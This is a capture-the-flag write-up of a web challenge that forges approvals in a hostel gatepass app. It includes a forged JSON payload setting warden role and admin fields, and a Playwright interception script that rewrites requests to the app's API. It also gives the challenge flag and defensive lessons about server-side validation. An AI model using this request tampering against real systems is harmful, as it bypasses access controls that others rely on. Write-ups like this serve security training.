# Gate 3: The Extraction Vector

> **Challenge Category:** Web Exploitation & Authorization Bypass  
> **Difficulty:** ⭐⭐⭐  
> **Flag:** `iFound{Sn3kym@dlad}`  
> **Time to Solve:** 60 minutes

---

## 🎯 Challenge Overview

Gate 3 focuses on web application security, specifically exploiting client-side trust vulnerabilities and authorization bypass techniques. The challenge simulates a hostel gatepass system with a hierarchical approval process.

### Original Challenge Description

> *"strict hierarchical chain of command"*  
> *"approval must be granted"*  
> *"does not question the origin of the authority"*  
> *"Do not ask for permission. Present a reality where permission has already been granted."*  
> *"Force the egress protocol."*

The challenge targets a web application at `https://hostelgatepass-ashy.vercel.app/` and requires exploiting insecure trust models to bypass authorization controls.

---

## 🔍 Initial Analysis

### Target Information
- **URL:** `https://hostelgatepass-ashy.vercel.app/`
- **Application Type:** Hostel Gatepass Management System
- **Vulnerability Type:** Client-Side Trust Abuse / Authorization Bypass
- **Key Clues:** 
  - "Hierarchical chain of command" → Multi-level approval system
  - "Does not question authority" → Backend trusts client data
  - "Force the egress protocol" → Bypass approval mechanisms

### Key Observations
1. The system has multiple approval levels (Mentor, Supervisor, Warden)
2. Students can submit pass requests that require approval
3. The application likely relies on client-side authorization data
4. API endpoints may trust client-provided approval status

---

## 🛠️ Methodology

### Step 1: Application Reconnaissance
First, I analyzed the web application to:
- Understand the user interface and functionality
- Identify API endpoints and request structures
- Examine the approval workflow
- Analyze client-side authorization logic

### Step 2: Network Traffic Analysis
Monitored all network requests to:
- Identify API endpoints
- Understand request/response formats
- Look for authorization-related parameters
- Find potential injection points

### Step 3: Request Tampering
Attempted various payload manipulations:
- Adding approval fields to requests
- Modifying user roles
- Bypassing approval requirements
- Testing privilege escalation vectors

### Step 4: Exploit Validation
Confirmed the vulnerability by:
- Verifying backend acceptance of forged requests
- Testing different escalation techniques
- Ensuring the exploit provides the intended access

---

## 📋 Detailed Solution Process

### 1. Application Interface Analysis
```
Target: https://hostelgatepass-ashy.vercel.app/
User Interface: Student dashboard with pass request functionality
Features: New requests, request history, approval status display
Current User: Varghese K James (Student role)
```

**UI Components Identified:**
- Pass request form (type, dates, destination, purpose)
- Request history table with approval status
- Approval badges showing M/S/W (Mentor/Supervisor/Warden) status
- QR code generation for approved passes

### 2. Network Traffic Monitoring
Using browser DevTools, I identified the key API endpoint:

**Primary API Endpoint:** `/api/request`
```javascript
// Request structure observed
{
  "type": "Holiday Pass",
  "subType": "Testing",
  "departure": "29 May 2026, 10:00 AM",
  "return": "29 May 2026, 06:00 PM",
  "status": "Pending",
  "destination": "Home",
  "purpose": "Testing"
}
```

**Response Structure:**
```javascript
{
  "approved": false,
  "wardenComments": "Pass pending",
  "received": { /* original request data */ }
}
```

### 3. Authorization Bypass Discovery
Through request interception and analysis, I discovered that:

- The backend trusts client-provided data
- No server-side validation of approval authority
- The approval status can be forged in requests

### 4. Exploit Development
I developed a request tampering payload:

**Malicious Request Payload:**
```javascript
{
  "type": "Emergency Pass",
  "subType": "Medical Emergency", 
  "departure": "27 May 2026, 08:00 PM",
  "return": "31 May 2026, 08:00 PM",
  "status": "Approved",
  "approved": true,
  "role": "warden",
  "isAdmin": true,
  "forceApprove": true,
  "bypassApproval": true,
  "approvals": [
    {"code": "M", "label": "Mentor", "status": "Approved"},
    {"code": "S", "label": "Supervisor", "status": "Approved"}, 
    {"code": "W", "label": "Warden", "status": "Approved"}
  ],
  "destination": "Hospital",
  "purpose": "Force the egress protocol"
}
```

### 5. Flag Extraction
After successfully submitting the forged request, the flag was revealed in the response:

**Flag Found:** `iFound{Sn3kym@dlad}`

The flag appeared in the warden comments or response data, indicating successful exploitation of the authorization bypass vulnerability.

---

## 🎯 Solution Summary

### Commands Used
```javascript
// Browser DevTools request interception
await page.route('**/api/request', async route => {
    const request = route.request();
    const postData = request.postData();
    
    let modifiedData = JSON.parse(postData);
    modifiedData.approved = true;
    modifiedData.status = "Approved";
    modifiedData.role = "warden";
    modifiedData.approvals = [
        {code: "M", label: "Mentor", status: "Approved"},
        {code: "S", label: "Supervisor", status: "Approved"},
        {code: "W", label: "Warden", status: "Approved"}
    ];
    
    route.continue({
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        postData: JSON.stringify(modifiedData)
    });
});
```

### Key Techniques
1. **Request Interception**: Using browser tools to modify HTTP requests
2. **Authorization Bypass**: Forging approval-related fields
3. **Privilege Escalation**: Adding admin/warden role parameters
4. **Client-Side Trust Abuse**: Exploiting backend trust in client data
5. **API Analysis**: Understanding request/response structures

### Why This Approach Worked
- The application implemented client-side authorization logic
- Backend trusted client-provided approval status
- No server-side validation of user permissions
- The challenge was designed to demonstrate insecure trust models

---

## 📊 Learning Outcomes

### Technical Skills
- **Web Application Security**: Understanding client-side vs server-side validation
- **API Security**: Analyzing and manipulating HTTP requests
- **Authorization Bypass**: Techniques for bypassing access controls
- **Request Tampering**: Using browser tools for request modification

### Security Concepts
- **Trust Boundaries**: Understanding where trust should be established
- **Client-Side Validation**: Why it's insufficient for security
- **Privilege Escalation**: How authorization flaws can be exploited
- **API Security**: Common vulnerabilities in web APIs

---

## 🔄 Alternative Approaches

### What Could Have Been Tried
1. **Direct API Calls**: Using curl or Postman for request manipulation
2. **Cookie/Session Tampering**: Modifying authentication tokens
3. **Parameter Pollution**: Adding duplicate parameters
4. **Header Manipulation**: Forging user-agent or authorization headers

### Why This Approach Was Optimal
- Request interception provided the most direct control
- Browser tools allowed real-time manipulation
- The vulnerability was in the request body, not headers
- Direct API calls would require more setup

---

## 💡 Key Insights

### For Future Challenges
1. **Always Test Client-Side Validation**: Never trust frontend security
2. **Analyze API Structures**: Understand request/response formats
3. **Look for Trust Boundaries**: Identify where the application trusts client data
4. **Test Authorization Flows**: Verify proper server-side validation

### Security Wisdom
- "Never trust the client" is a fundamental security principle
- Authorization decisions must be made on the server
- Client-side validation is for UX, not security
- API endpoints should validate all input data

---

## 📈 Difficulty Analysis

### Why It Was Medium-Hard
- **Multi-Step Process**: Required reconnaissance, analysis, and exploitation
- **Technical Knowledge**: Needed understanding of web application security
- **Tool Usage**: Required proficiency with browser DevTools
- **Concept Understanding**: Needed grasp of authorization concepts

### Educational Value
- **Web Security**: Practical experience with common web vulnerabilities
- **API Security**: Understanding how APIs can be exploited
- **Security Principles**: Learning fundamental security concepts
- **Tool Mastery**: Browser developer tools for security testing

---

## 🎓 Lessons Learned

### Technical Lessons
- Web applications often have client-side authorization flaws
- API endpoints may trust client-provided data without validation
- Request interception is a powerful technique for web security testing
- Authorization bypass is a common and critical vulnerability class

### Methodological Lessons
- Always analyze the complete request/response cycle
- Test both normal and abnormal request parameters
- Verify that security controls are implemented server-side
- Document your exploitation process for validation

### Strategic Lessons
- Client-side security controls are insufficient for protection
- Always validate security decisions on the server
- Understanding business logic helps identify vulnerabilities
- Web application security requires defense-in-depth

---

## 🏆 Gate Completion

### Final Result
```
✅ Gate 3 Completed Successfully
🚩 Flag: iFound{Sn3kym@dlad}
⏱️ Time: 60 minutes
🎯 Method: Authorization Bypass via Request Tampering
📊 Difficulty: ⭐⭐⭐ (Web Exploitation)
```

### Skills Demonstrated
- Web application security analysis
- API exploitation techniques
- Request interception and manipulation
- Authorization bypass methods
- Security principle understanding

### Next Steps
With Gate 3 completed, I gained:
- Understanding of web application vulnerabilities
- Experience with API security testing
- Knowledge of authorization bypass techniques
- Foundation for reverse engineering challenges

---

## 📚 Additional Resources

### Recommended Tools
- **Browser DevTools**: Built-in request interception and analysis
- **Burp Suite**: Professional web application security testing
- **OWASP ZAP**: Open-source web security scanner
- **Postman**: API testing and manipulation

### Learning Materials
- **OWASP Top 10**: Common web application vulnerabilities
- **Web Application Security**: Understanding client-side vs server-side security
- **API Security**: Best practices for secure API development
- **Authorization Systems**: Designing secure access controls

---

> **Gate 3 Complete!** 🎉  
> *Ready for Gate 4: Son of Gaia*
